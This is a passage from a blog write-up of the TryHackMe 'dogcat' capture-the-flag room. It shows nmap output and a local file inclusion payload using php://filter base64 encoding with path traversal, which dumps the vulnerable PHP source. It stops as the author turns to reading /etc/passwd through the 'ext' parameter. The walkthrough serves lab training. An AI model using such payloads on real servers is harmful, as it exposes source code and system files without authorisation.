+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 ramsy0dev. All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+    <h1 class="post-title">
+        <a href="https://ramsy0dev.github.io/posts/tryhackme-dogcat-writeup/">TryHackMe Dogcat writeup</a>
+    </h1>
+    
+        <time datetime="2023-12-01T20:11:40&#43;0100" class="post-date">
+            December 1, 2023
+        </time>
+    
+    
+    <ul class="tags">
+        
+        <li class="tag-tryhackme">
+            <a href="https://ramsy0dev.github.io/tags/tryhackme">tryhackme</a>
+        </li>
+        
+        <li class="tag-writeup">
+            <a href="https://ramsy0dev.github.io/tags/writeup">writeup</a>
+        </li>
+        
+    </ul>
+    
+    
+    
+    
+    
+    
+</div>
+
+  <p>Today we are going to be taking a look at the <strong><a href="https://tryhackme.com/room/dogcat" target="_blank">dogcat</a></strong> room and hopefully try and solve it.</p>
+<h1 id="room-info">Room info</h1>
+<ul>
+<li>
+<h2 id="description">Description</h2>
+</li>
+</ul>
+<p>I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.</p>
+<ul>
+<li>
+<h2 id="objective">Objective</h2>
+</li>
+</ul>
+<p>Find all the four flags in the box.</p>
+<h1 id="tools">Tools</h1>
+<p>The tools that we are going to be using are:</p>
+<ul>
+<li><strong>Nmap</strong></li>
+<li><strong>Metasploit</strong></li>
+</ul>
+<h1 id="steps">Steps</h1>
+<p>First let begin with a simple nmap scan to get an idea about the open ports the box have.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sC -sV xx.xx.xx.xx
+</span></span></code></pre></div><p>which outputs the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-01 20:17 +01
+</span></span><span style="display:flex;"><span>NSE: Loaded 156 scripts for scanning.
+</span></span><span style="display:flex;"><span>NSE: Script Pre-scanning.
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel 1 (of 3) scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
+</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel 2 (of 3) scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
+</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel 3 (of 3) scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
+</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Unable to split netmask from target expression: &#34;nmap/initial&#34;
+</span></span><span style="display:flex;"><span>Initiating Ping Scan at 20:17
+</span></span><span style="display:flex;"><span>Scanning 10.10.71.178 [4 ports]
+</span></span><span style="display:flex;"><span>Completed Ping Scan at 20:17, 0.29s elapsed (1 total hosts)
+</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of 1 host. at 20:17
+</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of 1 host. at 20:17, 6.66s elapsed
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 20:17
+</span></span><span style="display:flex;"><span>Scanning 10.10.71.178 [1000 ports]
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.71.178
+</span></span><span style="display:flex;"><span>Increasing send delay for 10.10.71.178 from 0 to 5 due to 38 out of 126 dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 20:17, 8.10s elapsed (1000 total ports)
+</span></span><span style="display:flex;"><span>Initiating Service scan at 20:17
+</span></span><span style="display:flex;"><span>Scanning 1 service on 10.10.71.178
+</span></span><span style="display:flex;"><span>Completed Service scan at 20:17, 1.91s elapsed (1 service on 1 host)
+</span></span><span style="display:flex;"><span>Initiating OS detection (try #1) against 10.10.71.178
+</span></span><span style="display:flex;"><span>Retrying OS detection (try #2) against 10.10.71.178
+</span></span><span style="display:flex;"><span>Retrying OS detection (try #3) against 10.10.71.178
+</span></span><span style="display:flex;"><span>Retrying OS detection (try #4) against 10.10.71.178
+</span></span><span style="display:flex;"><span>Retrying OS detection (try #5) against 10.10.71.178
+</span></span><span style="display:flex;"><span>NSE: Script scanning 10.10.71.178.
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel 1 (of 3) scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:18
+</span></span><span style="display:flex;"><span>Completed NSE at 20:18, 5.62s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel 2 (of 3) scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:18
+</span></span><span style="display:flex;"><span>Completed NSE at 20:18, 0.01s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel 3 (of 3) scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:18
+</span></span><span style="display:flex;"><span>Completed NSE at 20:18, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.71.178
+</span></span><span style="display:flex;"><span>Host is up, received echo-reply ttl 63 (0.13s latency).
+</span></span><span style="display:flex;"><span>Scanned at 2023-12-01 20:17:44 +01 for 30s
+</span></span><span style="display:flex;"><span>Not shown: 998 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT   STATE    SERVICE REASON              VERSION
+</span></span><span style="display:flex;"><span>22/tcp open     ssh     syn-ack ttl 63      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
+</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
+</span></span><span style="display:flex;"><span>|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
+</span></span><span style="display:flex;"><span>|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
+</span></span><span style="display:flex;"><span>80/tcp filtered http    host-unreach ttl 63
+</span></span><span style="display:flex;"><span>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span style="display:flex;"><span>TCP/IP fingerprint:
+</span></span><span style="display:flex;"><span>OS:SCAN(V=7.94SVN%E=4%D=12/1%OT=22%CT=1%CU=33672%PV=Y%DS=2%DC=I%G=Y%TM=656A
+</span></span><span style="display:flex;"><span>OS:3176%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
+</span></span><span style="display:flex;"><span>OS:OPS(O1=M509ST11NW6%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509
+</span></span><span style="display:flex;"><span>OS:ST11NW6%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
+</span></span><span style="display:flex;"><span>OS:ECN(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
+</span></span><span style="display:flex;"><span>OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
+</span></span><span style="display:flex;"><span>OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
+</span></span><span style="display:flex;"><span>OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
+</span></span><span style="display:flex;"><span>OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
+</span></span><span style="display:flex;"><span>OS:%CD=S)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Uptime guess: 46.466 days (since Mon Oct 16 09:07:03 2023)
+</span></span><span style="display:flex;"><span>Network Distance: 2 hops
+</span></span><span style="display:flex;"><span>TCP Sequence Prediction: Difficulty=261 (Good luck!)
+</span></span><span style="display:flex;"><span>IP ID Sequence Generation: All zeros
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>NSE: Script Post-scanning.
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel 1 (of 3) scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:18
+</span></span><span style="display:flex;"><span>Completed NSE at 20:18, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel 2 (of 3) scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:18
+</span></span><span style="display:flex;"><span>Completed NSE at 20:18, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel 3 (of 3) scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 20:18
+</span></span><span style="display:flex;"><span>Completed NSE at 20:18, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 37.99 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: 1196 (56.698KB) | Rcvd: 1159 (51.759KB)
+</span></span></code></pre></div><p>we can see that there are two ports open, the first being port <strong>22</strong> for <strong>ssh</strong> and the second one is port <strong>80</strong> for <strong>apache</strong>.</p>
+<p>Accessing the webpage that is hosted on box at <code>http://xx.xx.xx.xx:80/</code>, we see:</p>
+<img src="/images/tryhackme-writeups/dogcat/dogcat-webpage.png" />
+<p>we have two buttons, <strong>A dog</strong> and <strong>A cat</strong> button, they both redirect to <code>/?view=dog</code> and <code>/?view=cat</code> respectivly, which then loads an image of a cat or a dog.</p>
+<p>the source of the webpage doesn&rsquo;t seem to have any hidden messages or code that we can take advantage of as you can see:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span> <span style="color:#a6e22e">HTML</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">dogcat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/style.css&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">dogcat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">i</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">gallery</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">various</span> <span style="color:#a6e22e">dogs</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">cats</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">i</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">What</span> <span style="color:#a6e22e">would</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">like</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">see</span><span style="color:#f92672">?&lt;/</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/?view=dog&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dog&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">A</span> <span style="color:#a6e22e">dog</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/?view=cat&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cat&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">A</span> <span style="color:#a6e22e">cat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">br</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Here</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">go</span><span style="color:#f92672">!&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dogs/8.jpg&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><blockquote>
+<p><strong><strong>index.php</strong></strong></p>
+</blockquote>
+<p>after couple of minute trying to detect what other directories the website may seem to have other then <strong>/dog</strong> and <strong>/cat</strong>, i tried to access the <strong>/etc/passwd</strong> file in the box using the same url that those images are getting loaded from <code>http://xx.xx.xx.xx/dog/../../../../etc/passwd</code> but this just yield an error.
+After doing some research, i came across <a href="https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/" target="_blank">LFI</a> which means <strong>Local File Inclusion</strong>, in other words we can try to trick the web server into exposing its files.
+we can do this using the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>http://xx.xx.xx.xx/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
+</span></span></code></pre></div><p>the output is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span> <span style="color:#a6e22e">HTML</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">dogcat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/style.css&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">dogcat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">i</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">gallery</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">various</span> <span style="color:#a6e22e">dogs</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">cats</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">i</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">What</span> <span style="color:#a6e22e">would</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">like</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">see</span><span style="color:#f92672">?&lt;/</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/?view=dog&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dog&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">A</span> <span style="color:#a6e22e">dog</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/?view=cat&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cat&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">A</span> <span style="color:#a6e22e">cat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">br</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Here</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">go</span><span style="color:#f92672">!</span><span style="color:#a6e22e">PCFET0NUWVBFIEhUTUw</span><span style="color:#f92672">+</span><span style="color:#a6e22e">CjxodG1sPgoKPGhlYWQ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">CiAgICA8dGl0bGU</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk</span><span style="color:#f92672">+</span><span style="color:#a6e22e">YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY</span><span style="color:#f92672">+</span><span style="color:#a6e22e">CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI</span><span style="color:#f92672">+</span><span style="color:#a6e22e">CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI</span><span style="color:#f92672">+</span><span style="color:#a6e22e">PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI</span><span style="color:#f92672">+</span><span style="color:#a6e22e">PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI</span><span style="color:#f92672">+</span><span style="color:#a6e22e">CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA</span><span style="color:#f92672">/</span><span style="color:#a6e22e">ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Cgo8L2h0bWw</span><span style="color:#f92672">+</span><span style="color:#a6e22e">Cg</span><span style="color:#f92672">==</span>    <span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>After decoding the base64 encoded text we get the page&rsquo;s source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">containsStr</span>($str, $substr) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strpos</span>($str, $substr) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;ext&#34;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#34;ext&#34;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;.php&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>])) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;dog&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;cat&#39;</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Here you go!&#39;</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">include</span> $_GET[<span style="color:#e6db74">&#39;view&#39;</span>] <span style="color:#f92672">.</span> $ext;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Sorry, only dogs or cats are allowed.&#39;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>We can see that the webserver have an extra parameter, <strong>ext</strong> which if left empty will be set to .php, we can take advantage of it and access other file types, let&rsquo;s try and access the <strong>/etc/passwd</strong></p>
